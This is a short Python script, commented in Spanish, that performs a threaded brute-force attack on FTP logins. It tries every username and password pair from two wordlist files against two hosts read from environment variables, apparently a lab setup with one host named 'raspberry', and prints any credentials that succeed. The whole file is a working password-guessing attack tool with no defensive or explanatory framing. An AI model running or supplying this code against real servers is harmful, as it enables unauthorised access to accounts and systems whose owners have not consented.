from ftplib import FTP
from dotenv import load_dotenv
from pathlib import Path
import os
import signal
import threading

# Para al recoger control + C
def salir(sig, frame):
    print("\nProceso interrumpido por el usuario. Saliendo...")
    exit()

signal.signal(signal.SIGINT, salir)

# Cargar variables de entorno desde el archivo .env
env_path = Path(__file__).parent / ".env"
load_dotenv(dotenv_path=env_path)

def ataque1(): 
    ftp_ip_host_friendly = os.getenv('FTP_IP_HOST_FRIENDLY')

    users_file = 'usuarios.txt'
    passwords_file = 'contrasenas.txt'

    with open(users_file, 'r') as archivo_usuarios:
        lista_usuarios = archivo_usuarios.read().splitlines()

    with open(passwords_file, 'r') as archivo_passwords:
        lista_passwords = archivo_passwords.read().splitlines()

    for usuario in lista_usuarios:
        for password in lista_passwords:
            try:
                ftp = FTP(ftp_ip_host_friendly)
                ftp.login(user=usuario, passwd=password)
                print(f"Conexion existosa {usuario} y {password}")
                ftp.quit()
                exit()

            except Exception as e:
                print(f"Error Fallo con usuario: {usuario} y contraseña: {password} en {ftp_ip_host_friendly}")
                try:
                    ftp.quit()
                except:
                    pass

    print("Ataque de fuerza bruta 1 terminado. No se encontraron las credenciales")

def ataque2(): 
    ftp_ip_host_raspberry = os.getenv('FTP_IP_HOST_RASPBERRY')

    users_file = 'usuarios.txt'
    passwords_file = 'contrasenas.txt'

    with open(users_file, 'r') as archivo_usuarios:
        lista_usuarios = archivo_usuarios.read().splitlines()

    with open(passwords_file, 'r') as archivo_passwords:
        lista_passwords = archivo_passwords.read().splitlines()

    for usuario in lista_usuarios:
        for password in lista_passwords:
            try:
                ftp = FTP(ftp_ip_host_raspberry)
                ftp.login(user=usuario, passwd=password)
                print(f"Conexion existosa {usuario} y {password}")
                ftp.quit()
                exit()

            except Exception as e:
                print(f"Error Fallo con usuario: {usuario} y contraseña: {password} en {ftp_ip_host_raspberry}")
                try:
                    ftp.quit()
                except:
                    pass

    print("Ataque de fuerza bruta 2 terminado. No se encontraron las credenciales")


    
hilo1 = threading.Thread(target= ataque1)
hilo2 = threading.Thread(target= ataque2)

hilo1.start()
hilo2.start()

hilo1.join()
hilo2.join()
print("Todos los hilos han finalizados")
